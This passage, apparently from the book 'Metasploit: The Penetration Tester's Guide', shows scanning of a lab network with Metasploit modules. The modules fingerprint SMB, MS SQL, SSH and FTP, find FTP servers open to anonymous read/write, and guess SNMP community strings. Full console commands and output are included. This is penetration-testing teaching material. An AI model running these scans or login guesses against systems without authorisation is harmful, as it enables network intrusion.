at <span class="s32">O </span>the <span class="s25">smb_version </span>scanner has pinpointed the operating system as Windows XP with Service Pack 2. Because we are scanning only one</p><p style="padding-left: 90pt;text-indent: 0pt;text-align: left;">system, we leave <span class="s25">THREADS </span>set to 1. If we had been scanning a number of systems, such as a class C subnet range, we might consider upping the <span class="s25">THREADS </span>using the <span class="s25">set THREADS </span><span class="s35">number </span>option. The results of this scan are stored in the Metasploit database for use at a later time and to be accessed with the <span class="s25">db_hosts </span>command.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_072.png"/></span></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">msf auxiliary(smb_version) &gt; <span class="s24">db_hosts -c address,os_flavor</span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">Hosts</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">=====</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">address os_flavor Svcs Vulns Workspace</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s27" style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="40" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_073.png"/></span>	<span><img width="52" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_074.png"/></span>	<span><img width="23" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_075.png"/></span><span class="s36"> </span><span><img width="29" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_076.png"/></span><span class="s36"> </span><span><img width="52" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_077.png"/></span></p><p class="s25" style="padding-top: 3pt;padding-bottom: 3pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">192.168.1.155 Windows XP 3 0 default msf auxiliary(smb_version) &gt;</p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_078.png"/></span></p><p style="padding-top: 6pt;padding-left: 90pt;text-indent: 18pt;text-align: justify;">We have discovered a system running Windows XP without having to do a full scan of the network. This is a great way to target hosts quickly and quietly that are likely to be more vulnerable when our goal is avoid being noticed.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s21" style="padding-left: 90pt;text-indent: 0pt;text-align: left;"><a name="bookmark99">Hunting for Poorly Configured Microsoft SQL Servers</a><a name="bookmark117">&zwnj;</a></p><p style="padding-top: 3pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">Poorly configured Microsoft SQL Server (MS SQL) installations often provide an initial way into a target network. In fact, many system administrators don’t even realize that they have MS SQL servers installed on their workstations at all, because the service is installed as a prerequisite for some common soft- ware, such as Microsoft Visual Studio. These installations are often unused, unpatched, or never even configured.</p><p style="padding-left: 90pt;text-indent: 18pt;text-align: left;">When MS SQL is installed, it listens by default either on TCP port 1433 or on a random dynamic TCP port. If MS SQL is listening on a dynamic port, simply query UDP port 1434 to discover on what dynamic TCP port MS SQL is listening. Of course, Metasploit has a module that can make use of this “feature”: <span class="s19">mssql_ping.</span></p><p style="padding-left: 90pt;text-indent: 18pt;text-align: left;">Because <span class="s19">mssql_ping </span>uses UDP, it can be quite slow to run across entire subnets because of issues with timeouts. But on a local LAN, setting <span class="s25">THREADS </span>to 255 will greatly speed up the scan. As Metasploit finds MS SQL servers, it displays all the details it can extract from them including, perhaps most impor- tantly, the TCP port on which the server is listening.</p><p style="padding-left: 90pt;text-indent: 18pt;text-align: left;">Here’s how you might run an <span class="s19">mssql_ping </span>scan, which includes starting the scan, listing and setting options, and the results.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 36pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="517" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_079.png"/></span></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">msf &gt; <span class="s24">use scanner/mssql/mssql_ping</span></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">msf auxiliary(mssql_ping) &gt; <span class="s24">show options</span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;text-align: left;">Module options:</p><p style="text-indent: 0pt;text-align: left;"><br/></p><table style="border-collapse:collapse;margin-left:49.2196pt" cellspacing="0"><tr style="height:16pt"><td style="width:47pt;border-bottom-style:dashed;border-bottom-width:1pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">Name</p></td><td style="width:64pt;border-bottom-style:dashed;border-bottom-width:1pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">Current Setting</p></td><td style="width:8pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:34pt;border-bottom-style:dashed;border-bottom-width:1pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">Required</p></td><td style="width:9pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:185pt;border-bottom-style:dashed;border-bottom-width:1pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">Description</p></td></tr><tr style="height:25pt"><td style="width:47pt;border-top-style:dashed;border-top-width:1pt"><p class="s28" style="padding-top: 3pt;padding-right: 11pt;text-indent: 0pt;line-height: 10pt;text-align: left;">PASSWORD RHOSTS</p></td><td style="width:64pt;border-top-style:dashed;border-top-width:1pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:8pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:34pt;border-top-style:dashed;border-top-width:1pt"><p class="s28" style="padding-top: 3pt;padding-right: 20pt;text-indent: 0pt;line-height: 10pt;text-align: left;">no yes</p></td><td style="width:9pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:185pt;border-top-style:dashed;border-top-width:1pt"><p class="s28" style="padding-top: 3pt;text-indent: 0pt;line-height: 11pt;text-align: left;">The password for the specified username</p><p class="s28" style="text-indent: 0pt;line-height: 9pt;text-align: left;">The target address range or CIDR identifier</p></td></tr></table><table style="border-collapse:collapse;margin-left:46.7196pt" cellspacing="0"><tr style="height:10pt"><td style="width:45pt"><p class="s28" style="padding-left: 2pt;text-indent: 0pt;line-height: 9pt;text-align: left;">THREADS</p></td><td style="width:45pt"><p class="s28" style="padding-left: 4pt;text-indent: 0pt;line-height: 9pt;text-align: left;">1</p></td><td style="width:59pt"><p class="s28" style="padding-left: 31pt;text-indent: 0pt;line-height: 9pt;text-align: left;">yes</p></td><td style="width:209pt"><p class="s28" style="padding-left: 14pt;text-indent: 0pt;line-height: 9pt;text-align: left;">The number of concurrent threads</p></td></tr><tr style="height:11pt"><td style="width:45pt"><p class="s28" style="padding-left: 2pt;text-indent: 0pt;line-height: 10pt;text-align: left;">USERNAME</p></td><td style="width:45pt"><p class="s28" style="padding-left: 4pt;text-indent: 0pt;line-height: 10pt;text-align: left;">sa</p></td><td style="width:59pt"><p class="s28" style="padding-left: 31pt;text-indent: 0pt;line-height: 10pt;text-align: left;">no</p></td><td style="width:209pt"><p class="s28" style="padding-left: 14pt;text-indent: 0pt;line-height: 10pt;text-align: left;">The username to authenticate as</p></td></tr><tr style="height:10pt"><td style="width:45pt"><p class="s28" style="padding-left: 2pt;text-indent: 0pt;line-height: 9pt;text-align: left;">WORKSPACE</p></td><td style="width:45pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:59pt"><p class="s28" style="padding-left: 31pt;text-indent: 0pt;line-height: 9pt;text-align: left;">no</p></td><td style="width:209pt"><p class="s28" style="padding-left: 14pt;text-indent: 0pt;line-height: 9pt;text-align: left;">The name of the workspace to report data into</p></td></tr></table><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-top: 3pt;padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">msf auxiliary(mssql_ping) &gt; <span class="s24">set RHOSTS 192.168.1.0/24</span></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">RHOSTS =&gt; 192.168.1.0/24</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">msf auxiliary(mssql_ping) &gt; <span class="s24">set THREADS 255</span></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">THREADS =&gt; 255</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">msf auxiliary(mssql_ping) &gt; <span class="s24">run</span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s30" style="padding-left: 24pt;text-indent: 0pt;text-align: left;">O <span class="s25">[*] SQL Server information for 192.168.1.155:</span></p><table style="border-collapse:collapse;margin-left:21.76pt" cellspacing="0"><tr style="height:10pt"><td style="width:36pt"><p class="s28" style="padding-right: 8pt;text-indent: 0pt;line-height: 8pt;text-align: right;">[*]</p></td><td style="width:68pt"><p class="s28" style="padding-left: 8pt;text-indent: 0pt;line-height: 8pt;text-align: left;">ServerName</p></td><td style="width:298pt"><p class="s28" style="padding-left: 8pt;text-indent: 0pt;line-height: 8pt;text-align: left;">= V-XPSP2-BARE</p></td></tr><tr style="height:11pt"><td style="width:36pt"><p class="s33" style="padding-right: 8pt;text-indent: 0pt;line-height: 9pt;text-align: right;">8 <span class="s28">[*]</span></p></td><td style="width:68pt"><p class="s28" style="padding-left: 8pt;text-indent: 0pt;line-height: 9pt;text-align: left;">InstanceName</p></td><td style="width:298pt"><p class="s28" style="padding-left: 8pt;text-indent: 0pt;line-height: 9pt;text-align: left;">= SQLEXPRESS</p></td></tr><tr style="height:11pt"><td style="width:36pt"><p class="s28" style="padding-right: 8pt;text-indent: 0pt;line-height: 9pt;text-align: right;">[*]</p></td><td style="width:68pt"><p class="s28" style="padding-left: 8pt;text-indent: 0pt;line-height: 9pt;text-align: left;">IsClustered</p></td><td style="width:298pt"><p class="s28" style="padding-left: 8pt;text-indent: 0pt;line-height: 9pt;text-align: left;">= No</p></td></tr><tr style="height:11pt"><td style="width:36pt"><p class="s33" style="padding-right: 8pt;text-indent: 0pt;line-height: 9pt;text-align: right;">@ <span class="s28">[*]</span></p></td><td style="width:68pt"><p class="s28" style="padding-left: 8pt;text-indent: 0pt;line-height: 9pt;text-align: left;">Version</p></td><td style="width:298pt"><p class="s28" style="padding-left: 8pt;text-indent: 0pt;line-height: 9pt;text-align: left;">= 10.0.1600.22</p></td></tr><tr style="height:15pt"><td style="width:36pt;border-bottom-style:solid;border-bottom-width:1pt"><p class="s33" style="padding-right: 8pt;text-indent: 0pt;line-height: 11pt;text-align: right;">O <span class="s28">[*]</span></p></td><td style="width:68pt;border-bottom-style:solid;border-bottom-width:1pt"><p class="s28" style="padding-left: 8pt;text-indent: 0pt;line-height: 9pt;text-align: left;">tcp</p></td><td style="width:298pt;border-bottom-style:solid;border-bottom-width:1pt"><p class="s28" style="padding-left: 8pt;text-indent: 0pt;line-height: 9pt;text-align: left;">= 1433</p></td></tr></table><p style="padding-top: 6pt;padding-left: 90pt;text-indent: 18pt;line-height: 72%;text-align: left;">As you can see, not only does the scanner locate a MS SQL server at <span class="s32">O</span>, but it also identifies the instance name at <span class="s32">8</span>, the SQL server version at <span class="s32">@</span>, and the TCP port number at <span class="s32">O </span>on which it is listening. Just think of how much time this targeted scan for SQL servers would save over running <span class="s19">nmap </span>against</p><p style="padding-left: 90pt;text-indent: 0pt;text-align: left;">all ports on all machines in a target subnet in search of the elusive TCP port.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s21" style="padding-left: 90pt;text-indent: 0pt;text-align: left;"><a name="bookmark100">SSH Server Scanning</a><a name="bookmark118">&zwnj;</a></p><p style="padding-top: 5pt;padding-left: 90pt;text-indent: 0pt;text-align: justify;">If during your scanning you encounter machines running Secure Shell (SSH), you should determine which version is running on the target. SSH is a secure protocol, but vulnerabilities in various implementations have been identified. You never know when you might get lucky and come across an old machine that hasn’t been updated. You can use the Framework’s <span class="s19">ssh_version </span>module to determine the SSH version running on the target server.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_080.png"/></span></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: justify;">msf &gt; <span class="s24">use scanner/ssh/ssh_version</span></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 10pt;text-align: left;">msf auxiliary(ssh_version) &gt; <span class="s24">set THREADS 50</span></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 10pt;text-align: left;">THREADS =&gt; 50</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">msf auxiliary(ssh_version) &gt; <span class="s24">run</span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">[*] 192.168.1.1:22, SSH server version: SSH-2.0-dropbear_0.52 [*] Scanned 044 of 256 hosts (017% complete)</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">[*] 192.168.1.101:22, SSH server version: SSH-2.0-OpenSSH_5.1p1 Debian-3ubuntu1 [*] Scanned 100 of 256 hosts (039% complete)</p><p class="s25" style="padding-bottom: 3pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">[*] 192.168.1.153:22, SSH server version: SSH-2.0-OpenSSH_4.3p2 Debian-8ubuntu1 [*] 192.168.1.185:22, SSH server version: SSH-2.0-OpenSSH_4.3</p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_081.png"/></span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 90pt;text-indent: 18pt;text-align: justify;">This output tells us that a few different servers are running with various patch levels. This information could prove useful if, for example, we wanted to attack a specific version of OpenSSH as found with the <span class="s19">ssh_version </span>scan.</p><p class="s21" style="padding-top: 3pt;padding-left: 90pt;text-indent: 0pt;text-align: justify;"><a name="bookmark101">FTP Scanning</a><a name="bookmark119">&zwnj;</a></p><p style="padding-top: 3pt;padding-left: 90pt;text-indent: 0pt;text-align: justify;">FTP is a complicated and insecure protocol. FTP servers are often the easiest way into a target network, and you should always scan for, identify, and finger- print any FTP servers running on your target.</p><p style="padding-left: 108pt;text-indent: 0pt;text-align: justify;">Next, we scan our XP box for FTP services using the Framework’s</p><p class="s19" style="padding-left: 90pt;text-indent: 0pt;text-align: justify;">ftp_version <span class="p">module:</span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 36pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="517" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_082.png"/></span></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">msf &gt; <span class="s24">use scanner/ftp/ftp_version</span></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">msf auxiliary(ftp_version) &gt; <span class="s24">show options</span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;text-align: left;">Module options:</p><p style="text-indent: 0pt;text-align: left;"><br/></p><table style="border-collapse:collapse;margin-left:49.2196pt" cellspacing="0"><tr style="height:16pt"><td style="width:47pt;border-bottom-style:dashed;border-bottom-width:1pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">Name</p></td><td style="width:89pt;border-bottom-style:dashed;border-bottom-width:1pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">Current Setting</p></td><td style="width:34pt;border-bottom-style:dashed;border-bottom-width:1pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">Required</p></td><td style="width:9pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:193pt;border-bottom-style:dashed;border-bottom-width:1pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">Description</p></td></tr><tr style="height:15pt"><td style="width:47pt;border-top-style:dashed;border-top-width:1pt"><p class="s28" style="padding-top: 3pt;text-indent: 0pt;line-height: 10pt;text-align: left;">FTPPASS</p></td><td style="width:89pt;border-top-style:dashed;border-top-width:1pt"><p style="padding-top: 3pt;text-indent: 0pt;line-height: 10pt;text-align: left;"><a href="mailto:mozilla@example.com" class="s37">mozilla@example.com</a></p></td><td style="width:34pt;border-top-style:dashed;border-top-width:1pt"><p class="s28" style="padding-top: 3pt;text-indent: 0pt;line-height: 10pt;text-align: left;">no</p></td><td style="width:9pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:193pt;border-top-style:dashed;border-top-width:1pt"><p class="s28" style="padding-top: 3pt;text-indent: 0pt;line-height: 10pt;text-align: left;">The password for the specified username</p></td></tr><tr style="height:11pt"><td style="width:47pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">FTPUSER</p></td><td style="width:89pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">anonymous</p></td><td style="width:34pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">no</p></td><td style="width:9pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:193pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">The username to authenticate as</p></td></tr><tr style="height:11pt"><td style="width:47pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">RHOSTS</p></td><td style="width:89pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:34pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">yes</p></td><td style="width:9pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:193pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">The target address range or CIDR identifier</p></td></tr><tr style="height:11pt"><td style="width:47pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">RPORT</p></td><td style="width:89pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">21</p></td><td style="width:34pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">yes</p></td><td style="width:9pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:193pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">The target port</p></td></tr><tr style="height:11pt"><td style="width:47pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">THREADS</p></td><td style="width:89pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">1</p></td><td style="width:34pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">yes</p></td><td style="width:9pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:193pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">The number of concurrent threads</p></td></tr><tr style="height:10pt"><td style="width:47pt"><p class="s28" style="text-indent: 0pt;line-height: 9pt;text-align: left;">WORKSPACE</p></td><td style="width:89pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:34pt"><p class="s28" style="text-indent: 0pt;line-height: 9pt;text-align: left;">no</p></td><td style="width:9pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:193pt"><p class="s28" style="text-indent: 0pt;line-height: 9pt;text-align: left;">The name of the workspace to report data into</p></td></tr></table><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">msf auxiliary(ftp_version) &gt; <span class="s24">set RHOSTS 192.168.1.0/24</span></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">RHOSTS =&gt; 192.168.1.0/24</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">msf auxiliary(ftp_version) &gt; <span class="s24">set THREADS 255</span></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">THREADS =&gt; 255</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">msf auxiliary(ftp_version) &gt; <span class="s24">run</span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s30" style="padding-top: 2pt;padding-bottom: 2pt;padding-left: 24pt;text-indent: 0pt;text-align: left;">O <span class="s25">[*] 192.168.1.155:21 FTP Banner: Minftpd ready</span></p><p style="padding-left: 36pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="517" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_083.png"/></span></p><p style="padding-top: 5pt;padding-left: 90pt;text-indent: 18pt;line-height: 89%;text-align: left;">The scanner successfully identifies an FTP server at <span class="s32">O</span>. Now let’s see if this FTP server allows anonymous logins using the Framework’s <span class="s19">scanner/ftp/ anonymous</span>.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_084.png"/></span></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">msf &gt; <span class="s24">use auxiliary/scanner/ftp/anonymous</span></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">msf auxiliary(anonymous) &gt; <span class="s24">set RHOSTS 192.168.1.0/24</span></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">RHOSTS =&gt; 192.168.1.0/24</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">msf auxiliary(anonymous) &gt; <span class="s24">set THREADS 50</span></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">THREADS =&gt; 50</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">msf auxiliary(anonymous) &gt; <span class="s24">run</span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 10pt;text-align: left;">[*] Scanned 045 of 256 hosts (017% complete)</p><p class="s30" style="padding-bottom: 1pt;padding-left: 15pt;text-indent: 0pt;line-height: 14pt;text-align: center;">O  <span class="s25">[*] 192.168.1.155:21 Anonymous READ/WRITE (220 Minftpd ready)</span></p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="445" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_085.png"/></span></p><p style="padding-top: 7pt;padding-left: 90pt;text-indent: 18pt;line-height: 81%;text-align: left;">The scanner reports at <span class="s32">O </span>that anonymous access is allowed and that anonymous users have both read and write access to the server; in other</p><p style="padding-left: 90pt;text-indent: 0pt;text-align: left;">words, we have full access to the remote system and the ability to upload or download any file that can be accessed by the FTP server software.</p><p class="s21" style="padding-top: 3pt;padding-left: 90pt;text-indent: 0pt;text-align: left;"><a name="bookmark102">Simple Network Management Protocol Sweeping</a><a name="bookmark120">&zwnj;</a></p><p style="padding-top: 4pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">The Simple Network Management Protocol (SNMP) is typically used in net- work devices to report information such as bandwidth utilization, collision rates, and other information. However, some operating systems also have SNMP servers that can provide information such as CPU utilization, free memory, and other system-specific details.</p><p style="padding-left: 90pt;text-indent: 18pt;text-align: left;">Convenience for the system administrator can be a gold mine for the penetration tester, and accessible SNMP servers can offer considerable infor- mation about a specific system or even make it possible to compromise a remote device. If, for instance, you can get the read/write SNMP community string for a Cisco router, you can download the router’s entire configuration, modify it, and upload it back to the router.</p><p style="padding-left: 90pt;text-indent: 18pt;text-align: left;">The Metasploit Framework includes a built-in auxiliary module called <span class="s19">scanner/snmp/snmp_enum </span>that is designed specifically for SNMP sweeps. Before you start the scan, keep in mind that the read-only (RO) and read/write (RW) community strings will play an important role in the type of information you will be able to extract from a given device. On Windows-based devices con- figured with SNMP, you can often use the RO or RW community strings to extract patch levels, running services, usernames, uptime, routes, and other information that can make things much easier for you during a pen test. (<span class="s19">Community strings </span>are essentially passwords used to query a device for infor- mation or to write configuration information to the device.)</p><p style="padding-left: 90pt;text-indent: 18pt;text-align: left;">After you guess the community strings, SNMP itself (depending on the version) can allow anything from excessive information disclosure to full sys- tem compromise. SNMPv1 and v2 are inherently flawed protocols. SNMPv3, which incorporates encryption and better check mechanisms, is significantly more secure. To gain access to a switch, you’ll first need to attempt to find its community strings. The Framework’s <span class="s19">use scanner/snmp/snmp_login </span>module will try a word list against one or a range of IP addresses.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_086.png"/></span></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">msf &gt; <span class="s24">use use scanner/snmp/snmp_login</span></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">msf auxiliary(snmp_login) &gt; <span class="s24">set RHOSTS 192.168.1.0/24</span></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">RHOSTS =&gt; 192.168.1.0/24</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">msf auxiliary(snmp_login) &gt; <span class="s24">set THREADS 50</span></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">THREADS =&gt; 50</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">msf auxiliary(snmp_login) &gt; <span class="s24">run</span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 10pt;text-align: left;">[*] &gt;&gt; progress (192.168.1.0-192.168.1.255) 0/30208...</p><p class="s25" style="padding-left: 78pt;text-indent: 0pt;line-height: 12pt;text-align: left;"><span class="s30">O </span>[*] 192.168.1.2 &#39;public&#39; &#39;<span class="s24">GSM7224 </span>L2 Managed Gigabit Switch&#39;</p><p class="s30" style="padding-left: 90pt;text-indent: -12pt;line-height: 80%;text-align: left;">8 <span class="s25">[*] 192.168.1.2 &#39;private&#39; &#39;GSM7224 L2 Managed Gigabit Switch&#39; [*] Auxiliary module execution completed</span></p><p class="s25" style="padding-bottom: 3pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">msf auxiliary(snmp_login) &gt;</p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_087.png"/></span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 90pt;text-indent: 18pt;line-height: 81%;text-align: left;">A quick Google search for <span class="s19">GSM7224 </span>from the output tells us that the scanner has found both the public <span class="s32">O </span>and private <span class="s32">8 </span>community strings for a Netgear switch. This result, believe it or not, has not been staged for this book.</p><p style="padding-left: 90pt;text-indent: 0pt;text-align: left;">These are the default factory settings for this switch.</p><p style="padding-top: 3pt;padding-left: 90pt;text-indent: 18pt;text-align: left;">You will encounter many jaw-dropping situations like these throughout your pen testing career, because many administrators simply attach devices to a network with all their defaults still in place. The situation is even scarier when you find these devices accessible from the Internet within a large corporation.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s4" style="padding-left: 36pt;text-indent: 0pt;text-align: left;"><a name="bookmark103">Writing a Custom Scanner</a><a name="bookmark121">&zwnj;</a></p><p style="padding-top: 8pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">Many applications and services lack custom modules in Metasploit. Thank- fully, the Framework has many features that can be useful when you’re build- ing a custom scanner, including offering access to all of its exploit classes and methods, and support for proxies, Secure Sockets Layer (SSL), report- ing, and threading. It can be very useful to write your own scanner during security assessments, because doing so will allow you to locate every instance of a bad password or unpatched service quickly on a target system.</p><p style="padding-left: 90pt;text-indent: 18pt;text-align: left;">The Metasploit Framework scanner modules include various mixins, such as exploit mixins for TCP, SMB, and so on, and the auxiliary <span class="s25">scanner </span>mixin that is built into the Framework. <span class="s19">Mixins </span>are portions of code with predefined functions and calls that are preconfigured for you. The <span class="s25">Auxiliary::Scanner </span>mixin overloads the Auxiliary <span class="s25">run </span>method; calls the module method at runt- ime with <span class="s25">run_host(ip)</span>, <span class="s25">run_range(range)</span>, or <span class="s25">run_batch(batch)</span>; and then pro- cesses the IP addresses. We can leverage <span class="s25">Auxiliary::Scanner </span>to call additional, built-in Metasploit functionality.</p><p style="padding-left: 90pt;text-indent: 18pt;text-align: justify;">Following is a Ruby script for a simple TCP scanner that will connect to a remote host on a default port of 12345 and upon connecting, send “HELLO SERVER,” receive the server response, and print it out along with the server’s IP address.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_088.png"/></span></p><p class="s25" 